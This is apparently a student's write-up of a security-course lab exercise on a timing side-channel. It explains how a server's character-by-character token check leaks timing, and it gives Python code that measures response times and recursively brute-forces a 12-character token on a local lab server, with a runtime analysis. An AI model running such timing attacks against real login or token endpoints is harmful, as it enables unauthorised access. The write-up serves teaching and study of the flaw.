- [Exercise 1: [attack] Just In Time](#exercise-1-attack-just-in-time)
    - [Understanding the vulnerability](#understanding-the-vulnerability)
  - [Attacking the vulnerability](#attacking-the-vulnerability)
    - [The lazy way](#the-lazy-way)
      - [Timing issue](#timing-issue)
    - [The smart way](#the-smart-way)

# Exercise 1: [attack] Just In Time

### Understanding the vulnerability

The handout already gives solid hints at the possible vulnerability. It seems the password we send is checked character by character, and behaves differently on correct and incorrect characters:
> [...] a modified function to compare strings which express some very specific timing behavior for each valid character in the submitted token…

We don't know the actual characters space, so we'll try simple: number and lowercase ASCII. If it doesn't work, we'll expand.

After poking a bit at the server, we understand we must send a token of exactly 12 characters (any different numbers yields a error 500 with content `wrong length, 4 vs 12`).

To understand what the _timing behaviour_ is, we send different passwords and check the timing for each of them. Also, because sending a POST request and time the response will be so frequent, we create a routine for it:

```py
import requests
import time
def post(token):
    before = time.time()
    resp = requests.post("http://0.0.0.0:8080/hw6/ex1",
                         json = {"token": token})
    after = time.time()

    time_diff = after-before
    # print("Token {}, request took {:.3f}"
    #       .format(token, time_diff)) # useful for debugging
    # print("response is {}".format(resp.text))  # often useless
    return time_diff
```

Simply post the token to the specified URL, with the specified json body, measure the time, and return it. Print some information for debugging.

So now we use that routine to try several tokens:
```py
import string
import time

TOKEN_LENGTH = 12

charset = string.digits + string.ascii_lowercase

for start_char in charset:
    token = start_char + (TOKEN_LENGTH-1) * "_"
    tdiff = post(token)
    print("Token {}, request took {:.3f}"
          .format(token, tdiff))
```

This will post one character followed by 11 `_`. The result from this code is the following:

```
Token 0___________, request took 0.004
Token 1___________, request took 0.003
Token 2___________, request took 0.003
Token 3___________, request took 0.003
Token 4___________, request took 0.004
Token 5___________, request took 0.005
Token 6___________, request took 0.005
Token 7___________, request took 0.004
Token 8___________, request took 0.005
Token 9___________, request took 0.005
Token a___________, request took 0.005
Token b___________, request took 0.063
Token c___________, request took 0.005
Token d___________, request took 0.005
Token e___________, request took 0.005
Token f___________, request took 0.006
Token g___________, request took 0.005
Token h___________, request took 0.006
Token i___________, request took 0.005
Token j___________, request took 0.004
Token k___________, request took 0.006
Token l___________, request took 0.004
Token m___________, request took 0.004
Token n___________, request took 0.004
Token o___________, request took 0.005
Token p___________, request took 0.006
Token q___________, request took 0.006
Token r___________, request took 0.004
Token s___________, request took 0.006
Token t___________, request took 0.004
Token u___________, request took 0.006
Token v___________, request took 0.006
Token w___________, request took 0.004
Token x___________, request took 0.004
Token y___________, request took 0.006
Token z___________, request took 0.005
```

If you observe attentively, you'll see that the one starting by `b` is about 10 times slower (or 0.06s slower). Interesting, let's try to narrow that down:

```py
def avg(elements: list):
    return sum(elements)/len(elements)

for start_char in charset:
    token = start_char + (TOKEN_LENGTH-1) * "_"
    timings = []
    for _ in range(100):
        timings.append(post(token))
    print("Token {}, request took in avg {:.3f}".format(token, avg(timings)))
```

Each token will be poster 100 times, and we measure the average timing. If you run this, you will notice it's a lot slower than before. And at `b`, it's noticeably different. The resulting means are:

```
Token 0___________, request took in avg 0.005
Token 1___________, request took in avg 0.005
Token 2___________, request took in avg 0.005
...
Token a___________, request took in avg 0.005
Token b___________, request took in avg 0.055
Token c___________, request took in avg 0.005
...
Token x___________, request took in avg 0.005
Token y___________, request took in avg 0.006
Token z___________, request took in avg 0.006
```
It becomes clear that a request takes ~0.005 seconds for incorrect characters, and adds about 0.05 seconds if the first character is correct. Let's try to understand, by checking the second character:

```py
for test_char in charset:
    token = "_" + test_char + (TOKEN_LENGTH-2) * "_"
    timings = []
    for _ in range(100):
        timings.append(post(token))
    print("Token {}, request took in avg {:.3f}".format(token, avg(timings)))
```
Now we put the first character as `_`, then modify the second one at every iteration, and fill with `_` after.

```
Token _0__________, request took in avg 0.005
Token _1__________, request took in avg 0.005
Token _2__________, request took in avg 0.005
Token _3__________, request took in avg 0.005
Token _4__________, request took in avg 0.005
Token _5__________, request took in avg 0.004
Token _6__________, request took in avg 0.005
...
Token _x__________, request took in avg 0.005
Token _y__________, request took in avg 0.005
Token _z__________, request took in avg 0.005
```

Interesting: no character seem to stand out. This means that there is indeed a char-by-char verification, and that if the character if incorrect, the check stops. So the second one is never evaluated.

Let's try again but with `b` as a first character (which seemed different previously):

```py
for test_char in charset:
    token = 'b' + test_char + (TOKEN_LENGTH-2) * "_"
    timings = []
    for _ in range(100):
        timings.append(post(token))
    print("Token {}, request took in avg {:.3f}".format(token, avg(timings)))
```

```
Token b0__________, request took in avg 0.056
Token b1__________, request took in avg 0.056
Token b2__________, request took in avg 0.055
Token b3__________, request took in avg 0.056
Token b4__________, request took in avg 0.108
Token b5__________, request took in avg 0.058
Token b6__________, request took in avg 0.057
...
Token bx__________, request took in avg 0.054
Token by__________, request took in avg 0.055
Token bz__________, request took in avg 0.055
```

Just as we expected: every token took about 0.055 seconds, except for `b4...` that took 0.05s longer.

From that, we can deduct the following: the server checks char by char. At each correct character, it "waits" (maybe does something else, but for us it translates to sleeping) for ~0.05 seconds (in avg). If the character is wrong, it stops immediately.

## Attacking the vulnerability
While we could repeat the process above for each character, it would quickly become cumbersome. Much better to let Python do it for us!

We have 2 ways of attacking it. The lazy way and the smart way.

### The lazy way
What we notice is that the last correct character will take noticeable more time than the other incorrect characters. So one way is to simply measure (across multiple runs) the time for each character. Then we take the one that took the most time and decide it's the correct character. Then we "restart" with a new base token.

The code could look like that (in addition to previous imports and defined functions):

```py
def guess(token_start):
    if len(token_start) == TOKEN_LENGTH:
        print("Token: {}".format(token_start))
        return token_start

    times = []
    for char in charset:
        print(token_start+char, end="\r")

        char_times = []
        tentative_token = token_start + char + \
            (TOKEN_LENGTH - len(token_start) - 1)*'_'
        for _ in range(3): # let's do that 3 times to be more robuse.
            char_times.append(post(tentative_token))
        times.append((char, sum(char_times))) # compare sums of means, no difference
    max_char = max(times, key=lambda x: x[1])[0]  # char with longest time
    guess(token_start+max_char)

guess("")
```

This is a recursive function. It's not always a good idea (python doesn't do [Tail Recursion Optimization](https://neopythonic.blogspot.com/2009/04/tail-recursion-elimination.html); it allows for 1k recursions, but isn't as nicely optimized as others like Scala). But in our case, because we only have 12 recursions, we should be OK.

#### Timing issue
Now, that ain't the prettiest method out there, but it does the job. Its main flaw is the time it will take to complete. Let's do an analysis. Let's suppose each request takes 0.05 seconds, and that each valid character takes 0.05 more seconds. Arguably, both times are random, but this is a good enough estimations. Remember that each character is tested 3 times, to account for some possible randomness, and that our characters set has 36 characters

* Finding the first character:
  * Each of the 35 wrong character will take 3x0.05 = 0.15 seconds
  * The correct character will take 3x(0.05 + 0.05) = 0.30 seconds
  * We then need 35x0.15 + 1x0.30 = 5.55 seconds. Not too bad.
* Finding the second character:
  * Remember now each wrong second character must be preceded by the first correct character.
  * Each of the 35 wrong characters will take 3x (0.05 + 0.05) = 0.3 seconds. The first "0.05" is to pass the correct char, and the second is for the request.
  * The correct char will take 3x (0.05 + 0.05 + 0.05) = 0.45 seconds. The 3 "0.05" are for passing the first and second character, and one for the request.
  * We now have a total lf 35x0.3 + 1x0.45 = 10.95 seconds. Almost doubled. And the total cracking time will need that, plus the time for all previous chars (so to crack a password of length 2, we need about 16 seconds now).

Clearly we can see a pattern now. Testing the last character for _one_ password of length L (for which the previous L-1 chars are correct) takes Lx0.05 if the last character is wrong, and (L+1)x0.05 if it's correct. Let's suppose:
* We do `T` trials (for randomness, here 3)
* We consider a characters space of `C` characters (here 36)
* We know the password has exactly length `L` (here 12)

A quick analysis leads us to the following formula
![Analytical time](./time_analytical.png)
Now grab your calculator, plug the numbers: 423 seconds, so about 7 minutes.

Even though it took longer to do that analysis than to crack the whole password, we'd still prefer to do that faster.


### The smart way

<small>Note: we won't provide a full explanation and code, but give you the general idea.</small>

When you run the code, you usually can tell the correct character without waiting the end. Obviously, the correct character will take significantly more time. If you do it 3 times, it becomes even more obvious. So what we have to do is to teach our program to "detect" these differences.

You again have 2 (smart) ways to do it:
* The first one consists in supposing/guessing/finding the time a correct or wrong request _should_ take. In our case, we deduced about 0.05s + 0.05s per correct characters. From that, we can do the request, and check if the required time has reached that expected threshold. This needs some tuning. What we want to do is to check whether we are epsilon-close to the expected value. But as the additional time required by correct characters is probably random, the time for the correct Nth char may not be that different. Tune the epsilon, maybe sum the time for multiple requests, and you should be fine.
* The second one consists in finding the different one. Once you've passed the correct character, you can already deduce which is the one that took "clearly longer". Measure the time for a few characters, then look for one that clearly deviates. If none, try different characters until one's time clearly deviates. This method also requires some tuning, because "different" is not so obvious. But again, playing with the epsilon, you should find a good algorithm.
